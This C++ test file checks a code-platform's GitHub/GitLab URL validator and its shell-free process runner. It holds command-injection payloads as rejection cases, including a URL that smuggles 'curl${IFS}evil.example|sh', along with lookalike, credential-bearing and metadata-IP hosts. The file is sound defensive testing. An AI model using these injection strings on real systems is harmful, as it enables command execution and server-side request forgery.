/**
 * @file security_tests.cpp
 * @brief Tests for repository URL validation and shell-free process execution
 *
 * @project Cortex Code Intelligence Platform
 *
 * @copyright Copyright (c) 2026 Kartick Kumar Ghosh
 * @license MIT
 */

#include "utils/EnvLimits.h"
#include "utils/ProcessRunner.h"
#include "utils/UrlValidator.h"

#include <chrono>
#include <climits>
#include <csignal>
#include <cstdio>
#include <cstdlib>
#include <filesystem>
#include <fstream>
#include <iterator>
#include <sstream>
#include <string>
#include <thread>
#include <vector>

#include <signal.h>
#include <unistd.h>

using cortex::utils::ProcessOptions;
using cortex::utils::ProcessRunner;
using cortex::utils::UrlValidator;

namespace {

int g_failures = 0;
int g_checks = 0;

void check(bool condition, const std::string& description) {
    ++g_checks;
    if (!condition) {
        ++g_failures;
        std::fprintf(stderr, "FAIL: %s\n", description.c_str());
    }
}

void expectAccept(const std::string& url, const std::string& canonical) {
    const auto result = UrlValidator::canonicalCloneUrl(url);
    check(result.has_value(), "should accept: " + url);
    if (result) {
        check(*result == canonical, "canonical for " + url + " expected " + canonical + " got " + *result);
    }
    check(UrlValidator::isValidRepositoryUrl(url), "isValidRepositoryUrl should accept: " + url);
}

void expectReject(const std::string& url) {
    check(!UrlValidator::canonicalCloneUrl(url).has_value(), "should reject: " + url);
    check(!UrlValidator::isValidRepositoryUrl(url), "isValidRepositoryUrl should reject: " + url);
}

void testValidUrls() {
    expectAccept("https://github.com/gavinspet/Cortex-Code-Intelligence-Platform",
                 "https://github.com/gavinspet/Cortex-Code-Intelligence-Platform.git");
    expectAccept("https://github.com/gavinspet/Cortex-Code-Intelligence-Platform.git",
                 "https://github.com/gavinspet/Cortex-Code-Intelligence-Platform.git");
    expectAccept("https://github.com/facebook/react/", "https://github.com/facebook/react.git");
    expectAccept("https://github.com/facebook/react.git/", "https://github.com/facebook/react.git");
    expectAccept("https://www.github.com/torvalds/linux", "https://github.com/torvalds/linux.git");
    expectAccept("https://github.com/my-org/repo.name_v2-x", "https://github.com/my-org/repo.name_v2-x.git");
    expectAccept("https://github.com/octo-org/.github", "https://github.com/octo-org/.github.git");
    expectAccept("https://github.com/a/b", "https://github.com/a/b.git");
    expectAccept("https://gitlab.com/gitlab-org/gitlab", "https://gitlab.com/gitlab-org/gitlab.git");
    expectAccept("https://gitlab.com/group/sub/project", "https://gitlab.com/group/sub/project.git");
    expectAccept("https://gitlab.com/group/sub/project.git", "https://gitlab.com/group/sub/project.git");
    expectAccept("https://github.com/" + std::string(39, 'a') + "/r",
                 "https://github.com/" + std::string(39, 'a') + "/r.git");
}

void testCaseInsensitiveSchemeAndHost() {
    // Scheme and host fold to lowercase; path case is preserved.
    expectAccept("HTTPS://GitHub.com/owner/repo", "https://github.com/owner/repo.git");
    expectAccept("https://GitHub.com/a/b", "https://github.com/a/b.git");
    expectAccept("HTTPS://github.com/a/b", "https://github.com/a/b.git");
    expectAccept("hTtPs://gItHuB.cOm/Owner/Repo.git", "https://github.com/Owner/Repo.git");
    expectAccept("https://WWW.GITHUB.COM/Torvalds/Linux", "https://github.com/Torvalds/Linux.git");
    expectAccept("https://GitLab.com/Group/Sub/Project", "https://gitlab.com/Group/Sub/Project.git");

    expectReject("HTTPS://GitHub.com.evil.com/a/b");
    expectReject("HTTPS://EVILGITHUB.COM/a/b");
    expectReject("hTtP://github.com/a/b");
    expectReject("HTTP://GitHub.com/owner/repo");
    expectReject("HTTPS://GITHUB.COM:443/a/b");
    expectReject("HTTPS://User@GitHub.com/a/b");
    expectReject("HTTPS://API.GITHUB.COM/a/b");
    expectReject("https://G\xC4\xB0thub.com/a/b");     // Turkish dotted capital I (U+0130)
    expectReject("https://githu\xE2\x84\xAA.com/a/b");  // KELVIN SIGN (U+212A) is not ASCII 'k'
    expectReject("https://GITHUB.COM./a/b");
}

void testShellMetacharacters() {
    const std::string base = "https://github.com/owner/repo";
    const std::vector<std::string> payloads = {
        ";id", "|id", "&id", "&&id", "$(id)", "`id`", ">x", "<x", " x", "\tx", "\nid",
        "'x'", "\"x\"", "\\x", "*", "?x", "#x", "!x", "${IFS}", "%3bid", "{a,b}", "~", "=x", "+x",
    };
    for (const auto& payload : payloads) {
        expectReject(base + payload);
        expectReject("https://github.com/owner" + payload + "/repo");
    }
    expectReject("https://github.com/a/b;id>/tmp/p;#/x");
    expectReject("https://github.com/a/b;curl${IFS}evil.example|sh;#/x");
    expectReject("https://github.com/a/b$(touch${IFS}/tmp/pwned)");
    expectReject("https://github.com/a/b\r\nX-Injected: 1");
    expectReject(std::string("https://github.com/a/b\0;id", 26));
}

void testLookalikeHosts() {
    const std::vector<std::string> urls = {
        "https://github.com.evil.com/a/b",
        "https://evilgithub.com/a/b",
        "https://evil.com/github.com/a/b",
        "https://evil.com/x/github.com",
        "https://github.com@evil.com/a/b",
        "https://user@github.com/a/b",
        "https://user:pass@github.com/a/b",
        "https://github.com:443/a/b",
        "https://github.com:22/a/b",
        "https://gitlab.com.attacker.io/a/b",
        "https://api.github.com/a/b",
        "https://gist.github.com/a/b",
        "https://raw.githubusercontent.com/a/b",
        "https://github.com./a/b",
        "https://169.254.169.254/github.com/a",
        "https://[::1]/a/b",
        "http://github.com/a/b",
        "git@github.com:a/b.git",
        "ssh://git@github.com/a/b.git",
        "git://github.com/a/b.git",
        "file:///etc/github.com/a",
        "https:/github.com/a/b",
        "https:///github.com/a/b",
        "//github.com/a/b",
        "github.com/a/b",
    };
    for (const auto& url : urls) {
        expectReject(url);
    }
}

void testMalformedPaths() {
    const std::vector<std::string> urls = {
        "",
        "https://",
        "https://github.com",
        "https://github.com/",
        "https://github.com/a",
        "https://github.com/a/",
        "https://github.com/a/b/c",
        "https://github.com/a/b/tree/main",
        "https://github.com/a/b?tab=readme",
        "https://github.com/a/b#readme",
        "https://github.com/../b",
        "https://github.com/a/..",
        "https://github.com/./b",
        "https://github.com/a/.",
        "https://github.com/a/...",
        "https://github.com//a/b",
        "https://github.com/a//b",
        "https://github.com/a/b//",
        "https://github.com/-a/b",
        "https://github.com/a-/b",
        "https://github.com/a/-b",
        "https://github.com/a_b/c",
        "https://github.com/a.b/c",
        "https://github.com/a/.git",
        "https://github.com/a/b/.git",
        "https://github.com/%2e%2e/b",
        "https://github.com/a/%2e%2e",
        "https://github.com/a/b%20c",
        "https://github.com/" + std::string(40, 'a') + "/r",
        "https://github.com/a/" + std::string(101, 'r'),
        "https://github.com/a/" + std::string(600, 'r'),
        "https://github.com/a/r\xC3\xA9po",
        "https://gitlab.com/a",
        "https://gitlab.com/a//b",
        "https://gitlab.com/a/../b",
        "https://gitlab.com/-a/b",
        "https://gitlab.com/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u",
    };
    for (const auto& url : urls) {
        expectReject(url);
    }
}

std::string uniquePath(const std::string& tag) {
    return (std::filesystem::temp_directory_path() /
            ("cortex_sec_" + tag + "_" + std::to_string(::getpid()))).string();
}

void testArgumentsAreNotShellInterpreted() {
    const std::string marker = uniquePath("pwned");
    std::filesystem::remove(marker);

    const std::vector<std::string> hostile = {
        "hello; touch " + marker,
        "$(touch " + marker + ")",
        "`touch " + marker + "`",
        "a | touch " + marker,
        "a && touch " + marker,
    };
    for (const auto& arg : hostile) {
        ProcessOptions options;
        options.timeout = std::chrono::seconds(5);
        options.inheritEnv = {"PATH"};
        const auto result = ProcessRunner::run({"/bin/echo", arg}, options);
        check(result.succeeded(), "echo should succeed for: " + arg);
        check(result.output == arg + "\n", "argument must be passed verbatim: " + arg + " got: " + result.output);
    }
    check(!std::filesystem::exists(marker), "shell metacharacters must not execute commands");
    std::filesystem::remove(marker);
}

// True once pid no longer exists or is a zombie (dead, awaiting reaping by init).
bool processIsDead(pid_t pid) {
    std::ifstream stat("/proc/" + std::to_string(pid) + "/stat");
    if (!stat) {
        return true;
    }
    std::string content((std::istreambuf_iterator<char>(stat)), std::istreambuf_iterator<char>());
    const auto close = content.rfind(')');
    return close != std::string::npos && close + 2 < content.size() &&
           (content[close + 2] == 'Z' || content[close + 2] == 'X');
}

bool waitUntilDead(pid_t pid, std::chrono::milliseconds limit) {
    const auto until = std::chrono::steady_clock::now() + limit;
    while (std::chrono::steady_clock::now() < until) {
        if (processIsDead(pid)) {
            return true;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(20));
    }
    return processIsDead(pid);
}

void testTimeoutKillsProcessGroup() {
    ProcessOptions options;
    options.timeout = std::chrono::milliseconds(1000);
    options.inheritEnv = {"PATH"};
    const auto start = std::chrono::steady_clock::now();
    // The shell reports its background child's PID, then waits. The grandchild is only
    // terminated if the whole process group is killed, not just the direct child.
    const auto result = ProcessRunner::run({"/bin/sh", "-c", "sleep 30 & echo $!; wait"}, options);
    const auto elapsed = std::chrono::steady_clock::now() - start;
    check(result.started, "timeout test should start");
    check(result.timedOut, "process should time out");
    check(result.termSignal == SIGKILL, "timed-out process should be SIGKILLed");
    check(!result.succeeded(), "timed-out process must not report success");
    check(elapsed < std::chrono::seconds(4), "timeout must be enforced promptly");

    long grandchild = 0;
    std::istringstream(result.output) >> grandchild;
    check(grandchild > 1, "grandchild PID should be reported, got: " + result.output);
    if (grandchild > 1) {
        const bool dead = waitUntilDead(static_cast<pid_t>(grandchild), std::chrono::milliseconds(2000));
        check(dead, "grandchild " + std::to_string(grandchild) + " must be terminated by the group kill");
        if (!dead) {
            ::kill(static_cast<pid_t>(grandchild), SIGKILL);
        }
    }
}

void testClosedStdoutStillTimesOut() {
    ProcessOptions options;
    options.timeout = std::chrono::milliseconds(1000);
    options.inheritEnv = {"PATH"};
    const auto start = std::chrono::steady_clock::now();
    // EOF arrives immediately, but the process keeps running.
    const auto result = ProcessRunner::run({"/bin/sh", "-c", "exec >&- 2>&-; sleep 30"}, options);
    const auto elapsed = std::chrono::steady_clock::now() - start;
    check(result.started, "closed-stdout test should start");
    check(result.timedOut, "closed-stdout process should time out");
    check(result.termSignal == SIGKILL, "closed-stdout process should be SIGKILLed");
    check(result.output.empty(), "closed-stdout process should produce no output");
    check(!result.succeeded(), "closed-stdout process must not report success");
    check(elapsed >= std::chrono::milliseconds(900), "closed-stdout process must run until the deadline");
    check(elapsed < std::chrono::seconds(4), "closed-stdout timeout must be enforced promptly");
}

void testOutputFloodTimesOut() {
    ProcessOptions options;
    options.timeout = std::chrono::milliseconds(1000);
    options.maxOutputBytes = 4096;
    options.inheritEnv = {"PATH"};
    const auto start = std::chrono::steady_clock::now();
    const auto result = ProcessRunner::run({"yes"}, options);
    const auto elapsed = std::chrono::steady_clock::now() - start;
    check(result.started, "flood test should start");
    check(result.timedOut, "endless output must time out");
    // The runner closes the read end before the group kill, so a writer may die of
    // SIGPIPE first; either way it is terminated by a signal and reaped.
    check(result.termSignal == SIGKILL || result.termSignal == SIGPIPE,
          "flooding process should be terminated, got signal " + std::to_string(result.termSignal));
    check(result.output.size() == 4096, "flood output must be capped, got " + std::to_string(result.output.size()));
    check(result.outputTruncated, "flood truncation must be reported");
    check(elapsed < std::chrono::seconds(4), "flood timeout must be enforced promptly");
}

void noopHandler(int) {}

// /proc/<pid>/status field such as "SigBlk" or "SigIgn" of the child process.
std::string statusField(const std::string& status, const std::string& field) {
    std::istringstream lines(status);
    std::string line;
    while (std::getline(lines, line)) {
        if (line.rfind(field + ":", 0) == 0) {
            const auto value = line.find_first_not_of(" \t", field.size() + 1);
            return value == std::string::npos ? "" : line.substr(value);
        }
    }
    return "";
}

void testChildSignalStateIsReset() {
    // Simulate the server: a caught SIGTERM, an ignored SIGINT and a blocked SIGUSR1.
    struct sigaction caught {};
    caught.sa_handler = noopHandler;
    ::sigemptyset(&caught.sa_mask);
    struct sigaction oldTerm {};
    struct sigaction oldInt {};
    ::sigaction(SIGTERM, &caught, &oldTerm);
    struct sigaction ignored {};
    ignored.sa_handler = SIG_IGN;
    ::sigemptyset(&ignored.sa_mask);
    ::sigaction(SIGINT, &ignored, &oldInt);
    sigset_t usr1;
    sigset_t oldMask;
    ::sigemptyset(&usr1);
    ::sigaddset(&usr1, SIGUSR1);
    ::pthread_sigmask(SIG_BLOCK, &usr1, &oldMask);

    ProcessOptions options;
    options.timeout = std::chrono::seconds(5);
    options.inheritEnv = {"PATH"};
    const auto result = ProcessRunner::run({"cat", "/proc/self/status"}, options);
    check(result.succeeded(), "cat /proc/self/status should run");
    check(statusField(result.output, "SigBlk") == "0000000000000000",
          "child must start with no blocked signals, got " + statusField(result.output, "SigBlk"));
    check(statusField(result.output, "SigIgn") == "0000000000000000",
          "child must not inherit ignored signals, got " + statusField(result.output, "SigIgn"));

    sigset_t after;
    ::pthread_sigmask(SIG_SETMASK, nullptr, &after);
    check(::sigismember(&after, SIGUSR1) == 1, "caller's blocked signals must be restored");
    check(::sigismember(&after, SIGTERM) == 0 && ::sigismember(&after, SIGCHLD) == 0,
          "caller must not be left with extra blocked signals");
    struct sigaction termNow {};
    ::sigaction(SIGTERM, nullptr, &termNow);
    check(termNow.sa_handler == noopHandler, "caller's signal handlers must be unchanged");

    ::pthread_sigmask(SIG_SETMASK, &oldMask, nullptr);
    ::sigaction(SIGINT, &oldInt, nullptr);
    ::sigaction(SIGTERM, &oldTerm, nullptr);
}

void testCloneTimeoutParsing() {
    using cortex::utils::cloneTimeoutSeconds;
    using cortex::utils::kDefaultCloneTimeoutSeconds;
    using cortex::utils::kMaxCloneTimeoutSeconds;
    using cortex::utils::parsePositiveCapped;
    check(kDefaultCloneTimeoutSeconds == 120, "default clone timeout is 120s");
    check(kMaxCloneTimeoutSeconds == 3600, "clone timeout cap is 3600s");
    check(cloneTimeoutSeconds(nullptr) == 120, "unset uses default");
    check(cloneTimeoutSeconds("") == 120, "empty uses default");
    check(cloneTimeoutSeconds("300") == 300, "in-range value is used");
    check(cloneTimeoutSeconds("1") == 1, "minimum positive value is used");
    check(cloneTimeoutSeconds("3600") == 3600, "cap itself is allowed");
    check(cloneTimeoutSeconds("3601") == 3600, "value above cap is clamped");
    check(cloneTimeoutSeconds("86400") == 3600, "large value is clamped");
    check(cloneTimeoutSeconds("9223372036854775807") == 3600, "LLONG_MAX is clamped");
    check(cloneTimeoutSeconds("99999999999999999999999") == 3600, "overflow is clamped");
    check(cloneTimeoutSeconds("0") == 120, "zero uses default");
    check(cloneTimeoutSeconds("-5") == 120, "negative uses default");
    check(cloneTimeoutSeconds("-99999999999999999999999") == 120, "negative overflow uses default");
    check(cloneTimeoutSeconds("abc") == 120, "non-numeric uses default");
    check(cloneTimeoutSeconds("300s") == 120, "trailing characters use default");
    check(cloneTimeoutSeconds(" 300") == 120, "leading whitespace uses default");
    check(cloneTimeoutSeconds("+300") == 120, "explicit sign uses default");
    check(parsePositiveCapped("5000000000", 1LL << 30, LLONG_MAX) == 5000000000LL,
          "uncapped limit (CLONE_MAX_FILE_BYTES) accepts large values");
}

void testExitCodeAndMissingExecutable() {
    ProcessOptions options;
    options.timeout = std::chrono::seconds(5);
    options.inheritEnv = {"PATH"};

    const auto ok = ProcessRunner::run({"true"}, options);
    check(ok.succeeded() && ok.exitCode == 0, "true should exit 0 (PATH resolution)");

    const auto fail = ProcessRunner::run({"false"}, options);
    check(fail.started && fail.exitCode == 1 && !fail.succeeded(), "false should exit 1");

    const auto missing = ProcessRunner::run({"cortex-definitely-missing-binary-xyz"}, options);
    check(!missing.started && !missing.error.empty(), "missing executable should not start");

    const auto empty = ProcessRunner::run({}, options);
    check(!empty.started, "empty argv should not start");
}

void testOutputCap() {
    ProcessOptions options;
    options.timeout = std::chrono::seconds(10);
    options.maxOutputBytes = 1024;
    options.inheritEnv = {"PATH"};
    const auto result = ProcessRunner::run({"head", "-c", "200000", "/dev/zero"}, options);
    check(result.succeeded(), "output-cap child should still complete");
    check(result.output.size() == 1024, "output must be capped at maxOutputBytes");
    check(result.outputTruncated, "truncation must be reported");
}

void testEnvironmentIsMinimal() {
    ::setenv("CORTEX_TEST_SECRET", "do-not-leak", 1);
    ProcessOptions options;
    options.timeout = std::chrono::seconds(5);
    options.inheritEnv = {"PATH"};
    options.setEnv = {{"GIT_TERMINAL_PROMPT", "0"}};
    const auto result = ProcessRunner::run({"env"}, options);
    check(result.succeeded(), "env should run");
    check(result.output.find("CORTEX_TEST_SECRET") == std::string::npos, "unlisted variables must not be inherited");
    check(result.output.find("GIT_TERMINAL_PROMPT=0") != std::string::npos, "explicit variables must be set");
    check(result.output.find("PATH=") != std::string::npos, "allowlisted variables must be inherited");
    ::unsetenv("CORTEX_TEST_SECRET");
}

void testFileSizeLimit() {
    const std::string target = uniquePath("fsize");
    std::filesystem::remove(target);
    ProcessOptions options;
    options.timeout = std::chrono::seconds(10);
    options.maxFileSizeBytes = 16 * 1024;
    options.inheritEnv = {"PATH"};
    const auto result = ProcessRunner::run(
        {"dd", "if=/dev/zero", "of=" + target, "bs=1024", "count=256"}, options);
    check(result.started && !result.succeeded(), "write beyond RLIMIT_FSIZE must fail");
    check(result.termSignal == SIGXFSZ, "write beyond RLIMIT_FSIZE should raise SIGXFSZ");
    std::error_code ec;
    const auto size = std::filesystem::file_size(target, ec);
    check(!ec && size <= 16 * 1024, "file must not exceed RLIMIT_FSIZE");
    std::filesystem::remove(target);
}

void testStdinIsDevNull() {
    ProcessOptions options;
    options.timeout = std::chrono::seconds(5);
    options.inheritEnv = {"PATH"};
    // cat would block forever on an inherited terminal; /dev/null gives immediate EOF.
    const auto result = ProcessRunner::run({"cat"}, options);
    check(result.succeeded() && result.output.empty(), "stdin must be /dev/null");
}

} // namespace

int main() {
    testValidUrls();
    testCaseInsensitiveSchemeAndHost();
    testShellMetacharacters();
    testLookalikeHosts();
    testMalformedPaths();
    testArgumentsAreNotShellInterpreted();
    testTimeoutKillsProcessGroup();
    testClosedStdoutStillTimesOut();
    testOutputFloodTimesOut();
    testChildSignalStateIsReset();
    testCloneTimeoutParsing();
    testExitCodeAndMissingExecutable();
    testOutputCap();
    testEnvironmentIsMinimal();
    testFileSizeLimit();
    testStdinIsDevNull();

    std::printf("%d checks, %d failures\n", g_checks, g_failures);
    return g_failures == 0 ? EXIT_SUCCESS : EXIT_FAILURE;
}
